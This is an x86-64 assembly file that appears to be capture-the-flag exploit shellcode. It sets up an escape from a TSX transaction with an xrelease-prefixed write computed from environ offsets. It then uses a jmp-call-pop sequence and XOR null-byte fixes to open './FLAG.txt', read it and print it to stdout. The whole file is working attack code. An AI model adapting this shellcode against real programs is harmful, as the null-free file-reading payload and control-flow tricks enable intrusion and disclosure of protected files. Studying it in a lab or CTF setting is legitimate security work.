%idefine rip rel $

global _start

_start:
jmp _close_tsx
db "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

_close_tsx:
mov rcx, [rip-0x15]
lea rdi, [rip]
;xor byte [rdi], 0x90
;xor byte [rdi + 31], 0x41
;xor byte [rdi + 32], 0x41
;mov rbx, [rcx+0x4122e478]

mov ax, 0x22e4
shl eax, 8
mov al, 0x78
;mov eax, 0x15243478
mov rbx, [rcx+rax]
;mov rbx, [rcx+0x22e478]

; rbx now points to the environ
;sub rbx, 0x41410584
xor rax, rax
mov ax, 0x0584
sub rbx, rax
;sub rbx, 0x0584
; Now rbx points to the value to restore to exit the transaction
mov eax, [rbx]

sub rdi, 0x6c
xrelease mov dword [rdi], eax

mov rsp, rdi
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
xor byte [rdi + 10], 0x41
  
xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0x1ff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0x1ff; size to read
xor rax, rax
syscall
  
; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
  
; syscall exit
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "./FLAG.txtA"



